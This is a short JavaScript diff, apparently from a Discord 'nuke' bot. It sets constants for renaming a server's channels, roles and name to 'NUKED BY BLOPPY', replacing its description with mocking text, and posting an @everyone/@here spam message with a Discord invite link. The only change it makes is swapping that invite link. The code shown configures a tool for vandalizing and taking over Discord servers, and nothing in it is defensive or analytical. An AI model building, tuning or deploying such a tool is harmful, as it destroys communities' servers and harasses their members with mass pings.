@@ -19,7 +19,7 @@ const LOG_CHANNEL_ID = '1519135619559981058';
 const NUKE_CHANNEL_NAME = 'NUKED BY BLOPPY';
 const NUKE_ROLE_NAME = 'NUKED BY BLOPPY';
 const RENAME_TEXT = 'NUKED BY BLOPPY';
-const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/yYFzYNcs7Q ||`;
+const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/zARhgv3Q7U ||`;
 const ICON_URL = 'https://cdn.discordapp.com/attachments/1518777889728888957/1519134966502527017/sponge.jfif?ex=6a3c7430&is=6a3b22b0&hm=07b5b1c9ff1f2f4bb537664f6e0b0132636c84e0d66eb8119c319faf29e8ec41&';
 const SERVER_DESCRIPTION = 'HAHAHAHAHAHAHAH';
 const TARGET_VOICE_CHANNEL_ID = '1519135619559981059';
